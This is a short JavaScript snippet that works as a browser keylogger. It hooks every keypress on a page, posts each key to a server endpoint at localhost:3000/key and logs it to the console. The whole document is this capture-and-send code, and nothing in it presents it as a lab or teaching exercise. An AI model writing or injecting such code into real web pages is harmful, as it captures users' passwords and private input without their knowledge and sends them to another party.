document.addEventListener('keypress', (keyObj) => {
    fetch('http://localhost:3000/key', {
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({key: keyObj.key})
    })
        .then(() => {
            console.log(keyObj.key)
        })
})